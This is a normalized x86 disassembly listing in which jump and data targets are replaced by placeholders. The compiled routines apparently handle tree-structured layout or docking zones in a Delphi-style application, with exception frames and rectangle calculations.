jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43f994
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_43ff8c
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43f994
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43f9c8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43fa58
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov edx 0x2
call sub_43fa58
jmp r-xdata
retn
sub_43fa10
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43fac4
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov edx 0x2
call sub_43fac4
jmp r-xdata
retn
sub_43fa58
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_43fe8c
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43fac4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43f978
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_43fe8c
push eax
mov eax esi
call sub_43f9c8
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_43fe8c
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43fb74
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43f978
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_43ff8c
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43fac4
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43f978
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43fac4
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43f9c8
mov edx eax
add edx esi
mov eax ebx
call sub_43feb4
mov edx edi
mov eax ebx
call sub_43feb4
jmp r-xdata
mov eax ebx
call sub_43fd14
mov eax ebx
call sub_43ff64
mov ebx eax
test ebx ebx
jne r-xdata
sub_43fc1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f6c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fc0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
sub_43fc60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403430
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_438058
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43fce4
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_43ff64
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43fd14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43fac4
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43fac4
mov esi eax
push ebp
call sub_43fce4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ff64
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43fa58
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43fa58
mov ecx ebx
pop edx
call sub_412434
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_436d18
mov eax [ ebp - 0x4 ]
call sub_43fe8c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_43fe8c
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fe8c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_43fe8c
push ebx
mov ebx eax
mov eax ebx
call sub_43f994
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43f91c
test al al
je r-xdata
mov eax ebx
call sub_43f9c8
pop ebx
retn
sub_43fec8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43feb4
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43f964
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_43feb8
mov edx esi
call sub_43fec8
sub_43ff04
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43fe8c
mov edi eax
mov eax ebx
call sub_43f9c8
cmp edi eax
jl r-xdata
mov eax esi
call sub_43fb74
mov eax [ esi + 0x1c ]
push eax
push sub_441a14
mov edx esi
call sub_440240
mov eax ebx
call sub_43fe8c
mov edi eax
mov eax esi
call sub_43fa10
cmp edi eax
jle r-xdata
mov eax ebx
call sub_43ff04
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_43ff70
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43f994
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_43ff98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403204
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403540
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f940
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c85c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4219a0
mov edx eax
mov eax ebx
call sub_41c9d8
mov eax [ ebp - 0x4 ]
call sub_440168
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43fb74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4400ab
mov eax [ ebp - 0x4 ]
call sub_44016c
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43a834
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4400ab
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_441f3c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_440100
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44116c
mov eax [ esi + 0x10 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_440180
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_440180
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_440180
pop ecx
sub_4401d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_440180
pop ecx
sub_440204
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_440204
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_440204
pop ecx
sub_440258
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4401d8
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43fac4
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43fac4
push eax
mov edx 0x1
mov eax ebx
call sub_43fa58
push eax
mov edx 0x2
mov eax ebx
call sub_43fa58
pop edx
pop ecx
call sub_412434
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c40
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4402dc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43fd14
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412434
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_436d18
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f940
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4401d8
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43f964
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_441204
mov edx esi
mov eax ebx
call sub_4401d8
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_4372fc
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f940
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_4372e8
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43fac4
mov edx eax
mov eax edi
call sub_43feb4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43fac4
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43fac4
mov edx eax
mov eax edi
call sub_43feb4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43fac4
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4404ec
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_440694
jmp r-xdata
sub_4404ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f940
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_43fe8c
mov edx eax
mov eax ebx
call sub_43feb4
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_43feb4
mov eax [ esi + 0x64 ]
call sub_43fe8c
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44155c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_440240
mov eax [ esi + 0x64 ]
call sub_43fe8c
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44155c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_440240
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4418e0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_440240
mov eax [ esi + 0x64 ]
call sub_43fe8c
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_441a14
xor edx edx
mov eax esi
call sub_440240
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_43feb4
adc edx 0x0
mov eax ebx
call sub_43fb74
mov eax ebx
call sub_43ff04
push esi
push sub_441a14
xor edx edx
mov eax esi
call sub_440240
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_440694
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43fb74
mov eax [ ebx + 0x14 ]
call sub_43ff04
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44070c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_43fe8c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43fe8c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_43fe8c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43fa58
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43fa58
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_43fe8c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_43ff64
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43ff8c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43ff64
call sub_44070c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43ff8c
call sub_44070c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
